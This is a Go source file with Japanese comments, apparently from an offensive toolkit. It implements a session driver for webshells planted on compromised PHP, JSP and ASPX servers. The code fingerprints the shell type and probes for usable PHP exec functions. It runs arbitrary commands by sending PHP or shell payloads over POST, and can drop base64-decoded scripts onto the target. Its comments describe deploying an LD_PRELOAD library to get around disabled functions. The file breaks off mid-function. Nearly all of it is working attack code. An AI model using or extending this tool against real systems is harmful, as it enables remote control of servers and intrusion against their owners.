// http_shell.go は HTTP ワンライナー WebShell のセッション駆動（中国菜刀/AntSword 形式の POST プロトコル）で、フェーズ 1a の重点。
//
// 対応する WebShell 種別（プロトコルファミリー共通の実装で、特定のターゲット値には依存しない）:
//   - PHP ワンライナー（eval 型）:POST のパスワードフィールドに値として PHP コードを送る。eval / assert の両ファミリーを
//     「コード実行フィールド」として通信する（PHP7 の assert(string) も同様に評価される）。family は debug_backtrace
//     プローブで判別し、コマンド実行関数は exec→shell_exec→system→passthru の順に探って使用可能なものを記憶する。
//     exec 系がすべて禁止（disable_functions）の場合は内蔵の LD_PRELOAD バイパスを自動で探る（bypass.go を参照）。
//   - PHP コマンドシェル（cmdshell、lang=phpcmd）:POST のパスワードフィールドに値として shell コマンドを直接送る。
//     WebShell 本体が直接 exec して stdout を返す（PHP eval なし）。振り返り R1:以前のプローブは eval 型しか認識せず、
//     コマンドシェルが全滅し、lang:auto で JSP と誤判定されていた。
//   - JSP ワンライナー：POST のパスワードフィールドに値として shell コマンドを送る（Runtime.exec("/bin/sh","-c",cmd)）。
//   - ASPX ワンライナー：POST のパスワードフィールドに値として shell コマンドを送る（cmd.exe /c）。
//
// すべての実行エコー出力は「リクエストごとにランダム生成するセンチネル対」で包む:開始/終了の marker が両方ヒットした場合のみ
// 中間の内容を採用する。欠落は失敗とみなし（関数禁止/WAF ブロック/WebShell 失効）、意味の分かるエラーを返す。
package session

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// ChunkSize はファイル読み書きのチャンクサイズ（64KB の元データ、base64 後は約 85KB）。
// 上限の根拠：Linux の execve では単一引数が MAX_ARG_STRLEN=128KB まで。書き込みが `/bin/sh -c`
// 経由のインライン base64 で書き込むとコマンドラインが単一引数になり、512KB のチャンク（b64 で ~700KB）は必ず E2BIG で落ちる
// （実運用では Tomcat の JSP WebShell が 256KB のインラインで HTTP 500、PHP exec 系も同様）。
// 暗号化 WebShell の read/write op は JSON POST body 経由でこの制限を受けない。http_shell_enc.go を参照。
const ChunkSize = 64 * 1024

const (
	defaultHTTPTimeout = 15 * time.Second
	maxBodyRead        = 8 << 20 // 1 レスポンスあたりの最大読み取り（チャンク設計では実需要を大きく上回る）
)

// phpExecFuncs は PHP コマンド実行関数の優先順位（プローブも降格もこれに従う）。
var phpExecFuncs = []string{"exec", "shell_exec", "system", "passthru"}

// ProbeInfo は register_session のプローブが返す WebShell 種別のフィンガープリント。
type ProbeInfo struct {
	Kind     string   `json:"kind"`     // http_php / http_phpcmd / http_jsp / http_aspx
	Lang     string   `json:"lang"`     // php / phpcmd / jsp / aspx
	Variant  string   `json:"variant"`  // php: eval | assert;phpcmd: cmd;その他は空
	Funcs    []string `json:"funcs"`    // php: 使用可能な実行関数（優先順位順）;その他は空
	Platform string   `json:"platform"` // linux | windows（可能な範囲でプローブし、デフォルトは言語ファミリーによる）

	// PHP eval WebShell の disable_functions フィンガープリントと内蔵バイパスプローブの結論（bypass.go を参照）。
	DisableFunctions bool   `json:"disable_functions,omitempty"` // exec 系がすべて禁止
	Mail             bool   `json:"mail,omitempty"`              // mail() が使用可能
	Putenv           bool   `json:"putenv,omitempty"`            // putenv() が使用可能
	Bypass           string `json:"bypass,omitempty"`            // 使用可能と確認済みのバイパス：ld_preload
	BypassLib        string `json:"bypass_lib,omitempty"`        // ターゲット側へ配備済みの .so パス
	BypassNote       string `json:"bypass_note,omitempty"`       // バイパスプローブの結論（使用不可の理由を含む）
}

// HTTPShell はワンライナー WebShell のセッション。ゼロ値は使用不可で、Probe / NewHTTPShell で構築する。
type HTTPShell struct {
	id       int64
	kind     string // http_php / http_phpcmd / http_jsp / http_aspx
	url      string
	password string // 接続パスワード = POST フィールド名
	lang     string // php / phpcmd / jsp / aspx
	variant  string // php: eval | assert;phpcmd: cmd
	platform string // linux | windows

	mu    sync.RWMutex
	funcs []string // php の使用可能な実行関数（プローブの記憶、禁止状態が変わったら再プローブ）

	// disable_functions フィンガープリントとバイパス登録（プローブ時に書き込み、復元経路では Secret から埋め戻す）。
	disableFuncs bool
	mailOK       bool
	putenvOK     bool
	bypass       string // 使用可能と確認済み：ld_preload
	bypassLib    string // 配備済み .so のターゲット側パス（拡張点:後続の session_exec がバイパス実行を使う）

	execMu sync.Mutex // セッション単位の実行直列化ロック（振り返り R5:同一セッションでの並行実行は出力が混線する）

	client *http.Client
	enc    *encTransport // 暗号化 WebShell（phpenc/jspenc）の伝送層。nil = フェーズ 1a の平文フォーム
}

// DirectHTTPClient はプラットフォーム直結の HTTP クライアントを返す。HTTP_PROXY などの env プロキシを明示的に使わない
// （ターゲット側へのリクエストはプラットフォームが直結する。worker マシンのプロキシ env は本コンポーネントとは無関係）。
func DirectHTTPClient(timeout time.Duration) *http.Client {
	if timeout <= 0 {
		timeout = defaultHTTPTimeout
	}
	return &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			Proxy: nil, // http.ProxyFromEnvironment は使わない:ターゲットへのリクエストは必ず直結する
		},
	}
}

// NewHTTPShell は既知のパラメータからセッションを構築する（DB 復元経路：WebShell 種別はプローブ済みなので再プローブしない）。
// lang: php / phpcmd / jsp / aspx。password が空のときのデフォルトは "cmd"。
func NewHTTPShell(shellURL, password, lang string) (*HTTPShell, error) {
	s := &HTTPShell{
		url:      strings.TrimSpace(shellURL),
		password: password,
		lang:     strings.ToLower(strings.TrimSpace(lang)),
		client:   DirectHTTPClient(0),
	}
	if s.password == "" {
		s.password = "cmd"
	}
	switch s.lang {
	case "php":
		s.kind, s.platform = "http_php", "linux"
	case "phpcmd":
		s.kind, s.platform, s.variant = "http_phpcmd", "linux", "cmd"
	case "jsp":
		s.kind, s.platform = "http_jsp", "linux"
	case "aspx":
		s.kind, s.platform = "http_aspx", "windows"
	default:
		return nil, opError("probe", "WebShell の言語を認識できません: %q（php/phpcmd/jsp/aspx に対応）", lang)
	}
	if _, err := url.ParseRequestURI(s.url); err != nil {
		return nil, opError("probe", "不正な WebShell URL: %v", err)
	}
	return s, nil
}

// SetID は永続化後に sessions テーブルの主キーを埋め戻す。
func (s *HTTPShell) SetID(id int64) { s.id = id }

// SetVariant はプローブ済みの family(php: eval/assert) を復元する。
func (s *HTTPShell) SetVariant(v string) { s.variant = v }

// SetPlatform はプローブ済みのプラットフォームを復元する。
func (s *HTTPShell) SetPlatform(p string) {
	if p == "linux" || p == "windows" {
		s.platform = p
	}
}

// SetFuncs はプローブ済みの PHP 実行関数一覧を復元する。
func (s *HTTPShell) SetFuncs(funcs []string) {
	s.mu.Lock()
	s.funcs = append([]string(nil), funcs...)
	s.mu.Unlock()
}

// Funcs はプローブで得た PHP 実行関数を返す（コピー）。
func (s *HTTPShell) Funcs() []string {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]string(nil), s.funcs...)
}

func (s *HTTPShell) ID() int64                   { return s.id }
func (s *HTTPShell) Kind() string                { return s.kind }
func (s *HTTPShell) Lang() string                { return s.lang }
func (s *HTTPShell) URL() string                 { return s.url }
func (s *HTTPShell) Close(context.Context) error { return nil } // HTTP セッションはリソースを持たない

// Secret は永続化する secret JSON の形（接続パラメータで、db 層が暗号化して保存する）。
type Secret struct {
	URL      string   `json:"url"`
	Password string   `json:"password"`
	Lang     string   `json:"lang"`
	Variant  string   `json:"variant,omitempty"`
	Platform string   `json:"platform,omitempty"`
	Funcs    []string `json:"funcs,omitempty"`
	// disable_functions フィンガープリントとバイパス登録（振り返り R1:プローブ結果は secret とともに永続化する。
	// sessions テーブルへの列追加より侵襲が小さく、復元後は再プローブ不要）。
	DisableFunctions bool   `json:"disable_functions,omitempty"`
	Mail             bool   `json:"mail,omitempty"`
	Putenv           bool   `json:"putenv,omitempty"`
	Bypass           string `json:"bypass,omitempty"`
	BypassLib        string `json:"bypass_lib,omitempty"`
	// 暗号化 WebShell（phpenc/jspenc）専用:セッション鍵（base64 32B）と保存済みの暗号化モード。
	Key     string `json:"key,omitempty"`
	EncMode string `json:"enc_mode,omitempty"`
}

// Secret は現在の接続パラメータを書き出す（プローブ後の完全なフィンガープリント）。
func (s *HTTPShell) Secret() Secret {
	sec := Secret{
		URL: s.url, Password: s.password, Lang: s.lang,
		Variant: s.variant, Platform: s.platform, Funcs: s.Funcs(),
		DisableFunctions: s.disableFuncs, Mail: s.mailOK, Putenv: s.putenvOK,
		Bypass: s.bypass, BypassLib: s.bypassLib,
	}
	if s.enc != nil {
		sec.Key = base64.StdEncoding.EncodeToString(s.enc.key)
		sec.EncMode = s.enc.Mode()
	}
	return sec
}

// RestoreHTTPShell は DB の secret からセッションを再構築する（起動時の復元で、再プローブはしない）。
// secret に Key が含まれる場合は暗号化 WebShell（phpenc/jspenc）として復元し、保存済みの暗号化モードも戻す。
func RestoreHTTPShell(id int64, sec Secret) (*HTTPShell, error) {
	var s *HTTPShell
	var err error
	if sec.Key != "" {
		s, err = NewEncShell(sec.URL, sec.Lang, sec.Key)
	} else {
		s, err = NewHTTPShell(sec.URL, sec.Password, sec.Lang)
	}
	if err != nil {
		return nil, err
	}
	s.id = id
	s.SetVariant(sec.Variant)
	s.SetPlatform(sec.Platform)
	s.SetFuncs(sec.Funcs)
	s.disableFuncs = sec.DisableFunctions
	s.mailOK = sec.Mail
	s.putenvOK = sec.Putenv
	s.bypass = sec.Bypass
	s.bypassLib = sec.BypassLib
	if s.enc != nil {
		s.enc.SetMode(sec.EncMode)
	}
	return s, nil
}

// ---------------- 伝送 ----------------

// post はフォーム POST を 1 回送る。ネットワーク層の失敗は一律 *Error。レスポンスボディは切り詰めて読む。
// 暗号化 WebShell（s.enc != nil）は暗号化伝送に切り替える:同一 payload を op=exec の暗号文チャネルで送る。
func (s *HTTPShell) post(ctx context.Context, fields url.Values, timeout time.Duration) (string, error) {
	body, _, err := s.postH(ctx, fields, timeout)
	return body, err
}

// postH は post と同じだがレスポンスヘッダも返す（auto 判定では汎用ヘッダの信号で phpcmd/jsp を区別する。
// 暗号化 WebShell のチャネルには平文レスポンスヘッダの意味がなく、常に nil を返す）。
func (s *HTTPShell) postH(ctx context.Context, fields url.Values, timeout time.Duration) (string, http.Header, error) {
	if s.enc != nil {
		body, err := s.enc.exec(ctx, fields.Get(s.password), timeout)
		return body, nil, err
	}
	if timeout <= 0 {
		timeout = defaultHTTPTimeout
	}
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, s.url,
		strings.NewReader(fields.Encode()))
	if err != nil {
		return "", nil, opError("http", "リクエストの構築に失敗しました: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (ARTEX)")
	resp, err := s.client.Do(req)
	if err != nil {
		return "", nil, opError("http", "HTTP リクエストに失敗しました（WebShell に到達できません：ターゲットの停止/タイムアウト/接続リセット）: %v", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBodyRead))
	if err != nil {
		return "", nil, opError("http", "レスポンスの読み取りに失敗しました: %v", err)
	}
	if resp.StatusCode >= 400 {
		return string(body), resp.Header, opError("http", "ブロックされたか WebShell が削除された可能性があります：ターゲットが HTTP %d を返しました: %s",
			resp.StatusCode, excerpt(string(body), 200))
	}
	return string(body), resp.Header, nil
}

// ---------------- センチネル ----------------

// sentinel は 1 リクエストにつき 1 対のランダムなセンチネル。ランダム化によりエコー出力の汚染/付着/誤ヒットを防ぐ:
// 固定 marker はターゲット出力に偶然現れた同名文字列に騙される（PivotHub の教訓）。
type sentinel struct{ start, end string }

func newSentinel() sentinel {
	var b [8]byte
	_, _ = rand.Read(b[:])
	h := hex.EncodeToString(b[:])
	return sentinel{start: h[:8], end: h[8:] + h[:4]}
}

// extract はセンチネルで包まれた内容を取り出す。start は最初の出現、end は start より後の最初の出現をとり、
// start がターゲット出力の末尾に付着して誤って切り出されるのを防ぐ。両方の marker が揃って初めて信用できる。
func (m sentinel) extract(body string) (string, bool) {
	i := strings.Index(body, m.start)
	if i < 0 {
		return "", false
	}
	rest := body[i+len(m.start):]
	j := strings.Index(rest, m.end)
	if j < 0 {
		return "", false
	}
	return rest[:j], true
}

// excerpt はエコー出力の要約を切り詰める（エラー用で、巨大な body がコンテキストに流れ込むのを防ぐ）。
func excerpt(s string, n int) string {
	s = strings.TrimSpace(s)
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func b64e(data []byte) string { return base64.StdEncoding.EncodeToString(data) }

// ---------------- プローブ ----------------

// Probe は url 上のワンライナー WebShell をプローブする:無害なプローブ（echo センチネル）を送り、エコー出力から WebShell 種別と使用可能な
// 実行関数を判定する。lang が "auto" の場合は「eval プローブと cmd プローブを別々に打ち、どちらのセンチネルが揃った方と判定する」
// 順序で判定する（probeAuto を参照）。失敗時はプローブのエコー出力の要約を含むエラーを返し、成功を装わない。
func Probe(ctx context.Context, shellURL, password, lang string) (*HTTPShell, ProbeInfo, error) {
	lang = strings.ToLower(strings.TrimSpace(lang))
	if lang == "" || lang == "auto" {
		return probeAuto(ctx, shellURL, password)
	}
	s, err := NewHTTPShell(shellURL, password, lang)
	if err != nil {
		return nil, ProbeInfo{}, err
	}
	info, err := s.probe(ctx)
	if err != nil {
		return nil, ProbeInfo{}, err
	}
	return s, info, nil
}

// probeAuto は自動判定する（振り返り R1 の修正:旧実装の eval プローブは sh コマンドシェルの「文字列連結」
// の偽装に騙されて PHP 分岐に入り、最終的に PHP コマンドシェルを http_jsp と誤判定していた）。順序:
//
//	① PHP eval プローブ。PHP 専用の構文（文字列連結+算術評価）で、sh コマンドシェルには解釈できない。
//	② sh コマンドプローブ（1 回）。ヒットすれば「POST フィールドがそのまま shell コマンド」のコマンドシェルで、
//	  さらに汎用レスポンスヘッダの信号で PHP コマンドシェル（phpcmd）/Java コンテナの WebShell（jsp）を区別する:
//	  X-Powered-By に PHP → phpcmd;JSESSIONID/コンテナのシグネチャ → jsp;
//	  信号なしのデフォルトは phpcmd（堅牢化した PHP はヘッダを落とすことが多く、両者の実行チャネルは同構造で誤判定のコストが対称）;
//	③ ASPX プローブ。cmd.exe 専用（未定義の変数は空に展開される）。
func probeAuto(ctx context.Context, shellURL, password string) (*HTTPShell, ProbeInfo, error) {
	var errs []string
	if s, err := NewHTTPShell(shellURL, password, "php"); err == nil {
		if info, perr := s.probe(ctx); perr == nil {
			return s, info, nil
		} else {
			errs = append(errs, fmt.Sprintf("[php-eval] %v", perr))
		}
	}
	hdr, err := probeCmdEcho(ctx, shellURL, password, "linux")
	if err == nil {
		lang := "phpcmd"
		if !phpServerHint(hdr) && javaContainerHint(hdr) {
			lang = "jsp"
		}
		s, cerr := NewHTTPShell(shellURL, password, lang)
		if cerr != nil {
			return nil, ProbeInfo{}, cerr
		}
		return s, ProbeInfo{Kind: s.kind, Lang: lang, Variant: s.variant, Platform: "linux"}, nil
	}
	errs = append(errs, fmt.Sprintf("[sh-cmd] %v", err))
	if s, err := NewHTTPShell(shellURL, password, "aspx"); err == nil {
		if info, perr := s.probe(ctx); perr == nil {
			return s, info, nil
		} else {
			errs = append(errs, fmt.Sprintf("[aspx] %v", perr))
		}
	}
	return nil, ProbeInfo{}, opError("probe", "WebShell 種別のプローブに失敗しました：%s", strings.Join(errs, "; "))
}

// probeCmdEcho は sh コマンドエコープローブを 1 回送り、ヒットしたらレスポンスヘッダを返す（phpcmd/jsp の判定用）。
func probeCmdEcho(ctx context.Context, shellURL, password, platform string) (http.Header, error) {
	s, err := NewHTTPShell(shellURL, password, "phpcmd")
	if err != nil {
		return nil, err
	}
	m := newSentinel()
	cmd, want := echoProbeCommand(m, platform)
	body, hdr, err := s.postH(ctx, url.Values{s.password: {cmd}}, 0)
	if err != nil {
		return nil, err
	}
	if !strings.Contains(body, want) {
		return nil, opError("probe", "コマンドプローブのセンチネルがエコー出力されません：コマンド実行型の WebShell ではない（POST フィールドが shell コマンドでない）、またはレスポンスが WAF に書き換えられています。エコー出力の要約: %q",
			excerpt(body, 200))
	}
	return hdr, nil
}

// phpServerHint は汎用レスポンスヘッダ（X-Powered-By）で PHP サーバを識別する。汎用プロトコルの信号だけを見て、
// 特定のターゲット値には一切依存しない。
func phpServerHint(h http.Header) bool {
	if h == nil {
		return false
	}
	return strings.Contains(strings.ToLower(h.Get("X-Powered-By")), "php")
}

// javaContainerHint は汎用レスポンスヘッダの信号で Java コンテナを識別する（JSESSIONID cookie、Server
// ヘッダのコンテナシグネチャ、X-Powered-By の servlet/jsp）。
func javaContainerHint(h http.Header) bool {
	if h == nil {
		return false
	}
	for _, c := range h.Values("Set-Cookie") {
		if strings.Contains(strings.ToUpper(c), "JSESSIONID") {
			return true
		}
	}
	server := strings.ToLower(h.Get("Server"))
	for _, sig := range []string{"coyote", "tomcat", "jetty", "glassfish", "jboss", "wildfly", "weblogic", "websphere", "resin", "servlet"} {
		if strings.Contains(server, sig) {
			return true
		}
	}
	powered := strings.ToLower(h.Get("X-Powered-By"))
	return strings.Contains(powered, "servlet") || strings.Contains(powered, "jsp")
}

// probe は選択済みの言語でプローブし、variant/funcs/platform を埋める。
func (s *HTTPShell) probe(ctx context.Context) (ProbeInfo, error) {
	info := ProbeInfo{Kind: s.kind, Lang: s.lang, Platform: s.platform}
	switch s.lang {
	case "php":
		// 1) 存続プローブ：PHP 専用の構文（文字列連結 + 算術評価）。コマンドシェルがこれを shell
		// コマンドとして実行すると `(20+22)` は構文エラーになり、S42E を返すことは絶対にない。これが eval WebShell と
		// コマンドシェルの境界（振り返り R1:旧プローブの `echo "S"."E"` は sh の連結でエコー出力されてしまう）。
		m := newSentinel()
		body, err := s.post(ctx, url.Values{s.password: {`echo "` + m.start + `".(20+22)."` + m.end + `";`}}, 0)
		if err != nil {
			return info, err
		}
		if !strings.Contains(body, m.start+"42"+m.end) {
			return info, opError("probe", "eval プローブのセンチネルがエコー出力されません：PHP コード実行型のワンライナーではない（プローブプロトコルの不一致）、またはレスポンスが WAF に書き換えられています。エコー出力の要約: %q", excerpt(body, 200))
		}
		// 2) family の判別：debug_backtrace の先頭フレームの関数名 eval / assert。
		fm := newSentinel()
		famPayload := `echo "` + fm.start + `";` +
			`$bt=@debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS,1);` +
			`echo (($bt[0]['function']??'')==='assert'?'assert':'eval');` +
			`echo "` + fm.end + `";`
		fbody, err := s.post(ctx, url.Values{s.password: {famPayload}}, 0)
		if err == nil {
			if out, ok := fm.extract(fbody); ok {
				info.Variant = strings.TrimSpace(out)
			}
		}
		if info.Variant != "assert" {
			info.Variant = "eval" // 判別失敗時は eval とみなす（両者の通信プロトコルは同じで、報告上の意味だけが異なる）
		}
		s.variant = info.Variant
		// 3) 能力フィンガープリント：exec 系関数 + mail()/putenv() の可用性（無害な function_exists
		// プローブで、disable_functions が結果にそのまま反映される）。
		caps, err := s.probePHPCaps(ctx)
		if err != nil {
			return info, err
		}
		info.Funcs = caps.funcs
		info.Mail, info.Putenv = caps.mail, caps.putenv
		s.SetFuncs(caps.funcs)
		s.mailOK, s.putenvOK = caps.mail, caps.putenv
		if len(caps.funcs) == 0 {
			info.DisableFunctions = true
			s.disableFuncs = true
			// 内蔵 LD_PRELOAD バイパスのプローブ（振り返り R1）:exec がすべて禁止かつ mail+putenv が使用可能な
			// ときにプリコンパイル済みの freestanding .so を配備して疎通を探る。失敗しても登録は妨げず、理由は BypassNote に入れる。
			if caps.mail && caps.putenv {
				s.probeBypass(ctx, &info)
			} else {
				info.BypassNote = "mail()/putenv() の両方が使用可能でなく、LD_PRELOAD バイパスの前提を満たしません"
			}
		}
		return info, nil
	case "phpcmd":
		// コマンド実行 WebShell:POST フィールドがそのまま shell コマンド。JSP チャネルと同構造（linux sh）で、
		// phpcmd を明示指定した場合はコンテナヘッダの信号を要求しない。
		if err := s.probeEcho(ctx, "linux"); err != nil {
			return info, err
		}
		s.platform = "linux"
		info.Platform = "linux"
		info.Variant = "cmd"
		return info, nil
	case "jsp":
		if err := s.probeEcho(ctx, "linux"); err != nil {
			return info, err
		}
		s.platform = "linux"
		info.Platform = "linux"
		return info, nil
	case "aspx":
		if err := s.probeEcho(ctx, "windows"); err != nil {
			return info, err
		}
		s.platform = "windows"
		info.Platform = "windows"
		return info, nil
	}
	return info, opError("probe", "未対応の言語 %q", s.lang)
}

// echoProbeCommand はコマンドエコープローブを構築する：linux は POSIX の算術展開 $((40+2)) を使い
// （cmd.exe ではそのまま出力されるので不一致）、windows は cmd バッチの未定義変数が空に展開されることを使い
// （sh では %VAR% がそのまま出力されるので不一致）。
func echoProbeCommand(m sentinel, platform string) (cmd, want string) {
	if platform == "windows" {
		return "echo " + m.start + "%ARTEX_PROBE_UNSET%" + m.end, m.start + m.end
	}
	return "echo " + m.start + "$((40+2))" + m.end + " 2>&1", m.start + "42" + m.end
}

// probeEcho はコマンドエコー型の WebShell（phpcmd/JSP/ASPX）をプローブする。プローブは言語ファミリーの特徴を持ち、auto プローブ同士の誤判定を防ぐ。
func (s *HTTPShell) probeEcho(ctx context.Context, platform string) error {
	m := newSentinel()
	cmd, want := echoProbeCommand(m, platform)
	body, err := s.post(ctx, url.Values{s.password: {cmd}}, 0)
	if err != nil {
		return err
	}
	if !strings.Contains(body, want) {
		return opError("probe", "センチネルがエコー出力されません：%s のコマンドエコー型ワンライナーではない（プローブプロトコルの不一致）、またはレスポンスが WAF に書き換えられています。エコー出力の要約: %q",
			strings.ToUpper(s.lang), excerpt(body, 200))
	}
	return nil
}

// phpCaps は PHP eval WebShell の能力フィンガープリント:使用可能な実行関数 + mail/putenv の可用性。
type phpCaps struct {
	funcs  []string
	mail   bool
	putenv bool
}

// probePHPCaps はターゲットの PHP で使用可能なコマンド実行関数（優先順位順）と mail()/putenv() の
// 可用性を列挙する（LD_PRELOAD バイパス前提のフィンガープリント、無害な function_exists プローブ）。
func (s *HTTPShell) probePHPCaps(ctx context.Context) (phpCaps, error) {
	var caps phpCaps
	m := newSentinel()
	payload := `echo "` + m.start + `";` +
		`foreach(array("exec","shell_exec","system","passthru","mail","putenv") as $f){if(function_exists($f)){echo $f.",";}}` +
		`echo "` + m.end + `";`
	body, err := s.post(ctx, url.Values{s.password: {payload}}, 0)
	if err != nil {
		return caps, err
	}
	out, ok := m.extract(body)
	if !ok {
		return caps, opError("probe", "関数列挙のセンチネルが欠落しています（WAF によるブロック/書き換えの疑い）。エコー出力の要約: %q", excerpt(body, 200))
	}
	have := map[string]bool{}
	for _, f := range strings.Split(out, ",") {
		have[strings.TrimSpace(f)] = true
	}
	for _, f := range phpExecFuncs { // ターゲットの列挙順ではなく優先順位順で返す
		if have[f] {
			caps.funcs = append(caps.funcs, f)
		}
	}
	caps.mail = have["mail"]
	caps.putenv = have["putenv"]
	return caps, nil
}

// Test はインターフェースが要求する疎通確認:存続プローブを再送する。暗号化 WebShell は op=probe の暗号化プローブを使う。
func (s *HTTPShell) Test(ctx context.Context) error {
	if s.enc != nil {
		return s.enc.probe(ctx, 0)
	}
	switch s.lang {
	case "php":
		m := newSentinel()
		body, err := s.post(ctx, url.Values{s.password: {`echo "` + m.start + `".(20+22)."` + m.end + `";`}}, 0)
		if err != nil {
			return err
		}
		if !strings.Contains(body, m.start+"42"+m.end) {
			return opError("test", "センチネルがエコー出力されません：WebShell が失効したか、レスポンスがブロック/書き換えられています。エコー出力の要約: %q", excerpt(body, 200))
		}
		return nil
	default:
		return s.probeEcho(ctx, s.platform)
	}
}

// ---------------- コマンド実行 ----------------

// needsScriptDrop はコマンドが「クォート回避のファイル書き出し」を通るかを判定する:シングルクォート/ダブルクォート/改行/バックスラッシュを含む
// 複雑なコマンドをセンチネルのラップ層にインライン化すると多層の shell に分解される（PivotHub base.py:34-61 の教訓:
// shlex.quote が生成する '"'"' が外側のダブルクォートを早々に終端させる）。
func needsScriptDrop(cmd string) bool {
	return strings.ContainsAny(cmd, "'\"\n\\")
}

// scriptDrop はコマンドを base64 でターゲットの一時ファイルに落としてから sh で実行する:ラップ層からは
// `sh <ファイル>` しか見えず（クォートのリスクなし）、コマンド本体はどの層の shell にも再解析されない。
// 一時ファイルには呼び出し側の名前空間プレフィックス（振り返り R5:per-worker プレフィックスで複数 worker の相互上書きを防ぐ）
// + ランダム部を使い、実行後に削除する（バックグラウンドタスクは fork 済みなので影響しない）。
func scriptDrop(cmd, prefix string) string {
	var b [6]byte
	_, _ = rand.Read(b[:])
	path := prefix + hex.EncodeToString(b[:]) + ".sh"
	return "echo " + b64e([]byte(cmd)) + " | base64 -d > " + path +
		" && sh " + path + "; rm -f " + path
}

// Exec は shell コマンドを 1 つ実行する。stderr は stdout にマージされる（webshell では分離できない）。
// セッション単位で直列化する（振り返り R5）:同一セッションでの並行実行は共有の一時ファイルや交錯したエコー出力で混線し、
// センチネルが「WebShell 失効」と誤報する。同一セッションは強制的に直列、セッション間は並行可能。
func (s *HTTPShell) Exec(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return "", "", opError("exec", "コマンドが空です")
	}
	s.execMu.Lock()
	defer s.execMu.Unlock()
	if s.lang == "aspx" {
		// Windows cmd には /bin/sh も base64 -d もないため、インラインのままにする（テンプレートは cmd /c 形式）。
		return s.execCmd(ctx, cmd, timeout)
	}
	if needsScriptDrop(cmd) {
		cmd = scriptDrop(cmd, tmpPrefixFrom(ctx))
	}
	if s.lang == "php" {
		return s.execPHP(ctx, cmd, timeout, true)
	}
	return s.execSh(ctx, cmd, timeout)
}

// execSh は JSP（linux sh）の経路:コマンドをセンチネルのラップに埋め込み、shell の解析は 1 回で済ませる。
func (s *HTTPShell) execSh(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
	m := newSentinel()
	wrapped := "echo " + m.start + "; " + cmd + " 2>&1; echo " + m.end
	body, err := s.post(ctx, url.Values{s.password: {wrapped}}, timeout)
	if err != nil {
		return "", "", err
	}
	out, ok := m.extract(body)
	if !ok {
		return "", "", opError("exec", "エコー出力にセンチネルがありません：コマンドが WAF にブロックされたか、WebShell が失効した可能性があります。エコー出力の要約: %q", excerpt(body, 400))
	}
	return strings.Trim(out, "\r\n"), "", nil
}

// execCmd は ASPX（windows cmd）の経路。
func (s *HTTPShell) execCmd(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
	m := newSentinel()
	wrapped := "echo " + m.start + "& " + cmd + " 2>&1 &echo " + m.end
	body, err := s.post(ctx, url.Values{s.password: {wrapped}}, timeout)
	if err != nil {
		return "", "", err
	}
	out, ok := m.extract(body)
	if !ok {
		return "", "", opError("exec", "エコー出力にセンチネルがありません：コマンドが WAF にブロックされたか、WebShell が失効した可能性があります。エコー出力の要約: %q", excerpt(body, 400))
	}
	return strings.Trim(out, "\r\n"), "", nil
}

// phpExecPayload は指定関数の実行 payload を生成する（function_exists によるガード:ターゲット側で
// 関数が禁止されている場合は NOFUNC センチネルを落とし、黙って失敗しない）。
func phpExecPayload(cmd, fn string, m sentinel) string {
	c := `$c=base64_decode("` + b64e([]byte(cmd)) + `");`
	body := `echo "NOFUNC";`
	switch fn {
	case "exec":
		body = `@exec($c." 2>&1",$o);echo implode("\n",$o);`
	case "shell_exec":
		body = `echo @shell_exec($c." 2>&1");`
	case "system":
		body = `@system($c." 2>&1");`
	case "passthru":
		body = `@passthru($c." 2>&1");`
	}
	return `echo "` + m.start + `";` + c +
		`if(function_exists("` + fn + `")){` + body + `}else{echo "NOFUNC";}` +
		`echo "\n` + m.end + `";`
}

// execPHP は記憶した使用可能関数で実行し、先頭の関数が失敗（禁止状態の変化/ブロック）した場合は優先順位に従って降格して
// 再試行する。すべて失敗した場合は意味の分かるエラーを返す。allowReprobe は再プローブの再帰を防ぐ。
func (s *HTTPShell) execPHP(ctx context.Context, cmd string, timeout time.Duration, allowReprobe bool) (string, string, error) {
	funcs := s.Funcs()
	if len(funcs) == 0 {
		msg := "ターゲットの PHP では exec/shell_exec/system/passthru が禁止されており（disable_functions）、session_exec の直接実行は使用できません。ファイル読み書きは引き続き使用できます"
		if s.bypass != "" {
			msg += "。使用可能なバイパス経路を登録済みです " + s.bypass + "（.so は配備済み " + s.bypassLib +
				"）。ただし現行バージョンの session_exec はまだバイパス実行に接続していません（拡張点、session/bypass.go を参照）"
		}
		return "", "", opError("exec", "%s", msg)
	}
	var lastErr error
	for _, fn := range funcs {
		m := newSentinel()
		body, err := s.post(ctx, url.Values{s.password: {phpExecPayload(cmd, fn, m)}}, timeout)
		if err != nil {
			return "", "", err // 伝送層の失敗は再試行しない（WebShell はほぼ確実に死んでいる）
		}
		out, ok := m.extract(body)
		if !ok {
			// センチネル欠落：WAF のブロックや関数の禁止による 500/空のエコー出力。次の関数へ降格する。
			lastErr = opError("exec", "関数 %s のエコー出力にセンチネルがありません（禁止/ WAF によるブロックの疑い）。エコー出力の要約: %q", fn, excerpt(body, 400))
			continue
		}
		if strings.Contains(out, "NOFUNC") {
			lastErr = opError("exec", "function_exists(%s) が偽です：この関数は disable_functions で無効化されています", fn)
			continue
		}
		return strings.Trim(out, "\r\n"), "", nil
	}
	// 記憶した関数がすべて失敗：1 回だけ再プローブし（ターゲットの php.ini が変わった可能性がある）、新しい一覧でもう一巡試す。
	if allowReprobe {
		if caps, err := s.probePHPCaps(ctx); err == nil {
			s.SetFuncs(caps.funcs)
			s.mailOK, s.putenvOK = caps.mail, caps.putenv
			if len(caps.funcs) > 0 && !sameStrings(caps.funcs, funcs) {
				return s.execPHP(ctx, cmd, timeout, false)
			}
		}
	}
	if lastErr != nil {
		return "", "", lastErr
	}
	return "", "", opError("exec", "ターゲットの PHP ではコマンド実行関数がすべて禁止されています（disable_functions）")
